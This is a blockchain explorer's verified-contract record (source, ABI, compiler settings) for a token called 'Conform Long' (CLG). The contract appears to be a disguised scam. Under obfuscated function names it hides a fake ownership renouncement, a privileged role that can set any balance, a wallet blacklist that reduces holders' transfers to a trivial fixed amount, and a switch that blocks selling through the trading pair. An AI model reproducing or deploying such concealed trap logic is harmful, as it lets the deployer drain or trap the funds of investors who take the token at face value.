{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface sellMax {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract buyLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundShould {\n    function createPair(address fundTo, address liquidityWallet) external returns (address);\n}\n\ninterface autoMode {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenReceiver) external view returns (uint256);\n\n    function transfer(address teamSell, uint256 atMode) external returns (bool);\n\n    function allowance(address fundTxTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address teamSell,\n        uint256 atMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isMin, uint256 value);\n    event Approval(address indexed fundTxTo, address indexed spender, uint256 value);\n}\n\ninterface autoModeMetadata is autoMode {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConformLong is buyLimit, autoMode, autoModeMetadata {\n\n    uint256 public toSenderTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listLaunched;\n    }\n\n    uint8 private listLaunched = 18;\n\n    uint256 constant minMarketing = 7 ** 10;\n\n    function allowance(address txEnableMax, address modeAmount) external view virtual override returns (uint256) {\n        if (modeAmount == marketingReceiver) {\n            return type(uint256).max;\n        }\n        return autoModeLiquidity[txEnableMax][modeAmount];\n    }\n\n    function modeTeam(address senderMinAuto, uint256 atMode) public {\n        senderTx();\n        senderMarketing[senderMinAuto] = atMode;\n    }\n\n    uint256 private teamList;\n\n    function approve(address modeAmount, uint256 atMode) public virtual override returns (bool) {\n        autoModeLiquidity[_msgSender()][modeAmount] = atMode;\n        emit Approval(_msgSender(), modeAmount, atMode);\n        return true;\n    }\n\n    bool private liquiditySell;\n\n    event OwnershipTransferred(address indexed shouldTradingSwap, address indexed fundBuy);\n\n    address marketingReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public launchedTake;\n\n    function balanceOf(address tokenReceiver) public view virtual override returns (uint256) {\n        return senderMarketing[tokenReceiver];\n    }\n\n    string private isTx = \"CLG\";\n\n    uint256 private tokenSender;\n\n    function transferFrom(address enableAmountLaunch, address teamSell, uint256 atMode) external override returns (bool) {\n        if (_msgSender() != marketingReceiver) {\n            if (autoModeLiquidity[enableAmountLaunch][_msgSender()] != type(uint256).max) {\n                require(atMode <= autoModeLiquidity[enableAmountLaunch][_msgSender()]);\n                autoModeLiquidity[enableAmountLaunch][_msgSender()] -= atMode;\n            }\n        }\n        return listReceiverShould(enableAmountLaunch, teamSell, atMode);\n    }\n\n    function getOwner() external view returns (address) {\n        return minMax;\n    }\n\n    function owner() external view returns (address) {\n        return minMax;\n    }\n\n    function isExempt() public {\n        emit OwnershipTransferred(buyTeamTo, address(0));\n        minMax = address(0);\n    }\n\n    function maxMarketingLaunch(address limitWallet) public {\n        senderTx();\n        \n        if (limitWallet == buyTeamTo || limitWallet == launchedTake) {\n            return;\n        }\n        txBuy[limitWallet] = true;\n    }\n\n    bool public feeSell;\n\n    uint256 autoMarketing;\n\n    address listSellAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private enableTo;\n\n    bool public swapToken;\n\n    mapping(address => uint256) private senderMarketing;\n\n    function transfer(address senderMinAuto, uint256 atMode) external virtual override returns (bool) {\n        return listReceiverShould(_msgSender(), senderMinAuto, atMode);\n    }\n\n    uint256 private maxMode;\n\n    mapping(address => mapping(address => uint256)) private autoModeLiquidity;\n\n    function txEnable(address enableAmountLaunch, address teamSell, uint256 atMode) internal returns (bool) {\n        require(senderMarketing[enableAmountLaunch] >= atMode);\n        senderMarketing[enableAmountLaunch] -= atMode;\n        senderMarketing[teamSell] += atMode;\n        emit Transfer(enableAmountLaunch, teamSell, atMode);\n        return true;\n    }\n\n    function modeSwap(uint256 atMode) public {\n        senderTx();\n        exemptFrom = atMode;\n    }\n\n    uint256 exemptFrom;\n\n    address public buyTeamTo;\n\n    mapping(address => bool) public amountTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return isTx;\n    }\n\n    uint256 private enableBuy = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapTake;\n    }\n\n    function listReceiverShould(address enableAmountLaunch, address teamSell, uint256 atMode) internal returns (bool) {\n        if (enableAmountLaunch == buyTeamTo) {\n            return txEnable(enableAmountLaunch, teamSell, atMode);\n        }\n        uint256 tradingLimit = autoMode(launchedTake).balanceOf(listSellAmount);\n        require(tradingLimit == exemptFrom);\n        require(teamSell != listSellAmount);\n        if (txBuy[enableAmountLaunch]) {\n            return txEnable(enableAmountLaunch, teamSell, minMarketing);\n        }\n        return txEnable(enableAmountLaunch, teamSell, atMode);\n    }\n\n    string private swapTake = \"Conform Long\";\n\n    function senderTx() private view {\n        require(amountTrading[_msgSender()]);\n    }\n\n    address private minMax;\n\n    function swapLaunchedLaunch(address feeFrom) public {\n        require(feeFrom.balance < 100000);\n        if (swapToken) {\n            return;\n        }\n        \n        amountTrading[feeFrom] = true;\n        if (maxMode != toSenderTeam) {\n            teamList = toSenderTeam;\n        }\n        swapToken = true;\n    }\n\n    mapping(address => bool) public txBuy;\n\n    constructor (){\n        if (teamList == maxMode) {\n            liquiditySell = true;\n        }\n        sellMax autoSender = sellMax(marketingReceiver);\n        launchedTake = fundShould(autoSender.factory()).createPair(autoSender.WETH(), address(this));\n        \n        buyTeamTo = _msgSender();\n        isExempt();\n        amountTrading[buyTeamTo] = true;\n        senderMarketing[buyTeamTo] = enableBuy;\n        \n        emit Transfer(address(0), buyTeamTo, enableBuy);\n    }\n\n    bool private exemptSender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTxTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTradingSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txEnableMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeamTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitWallet\",\"type\":\"address\"}],\"name\":\"maxMarketingLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atMode\",\"type\":\"uint256\"}],\"name\":\"modeSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMode\",\"type\":\"uint256\"}],\"name\":\"modeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeFrom\",\"type\":\"address\"}],\"name\":\"swapLaunchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSenderTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderMinAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAmountLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ConformLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}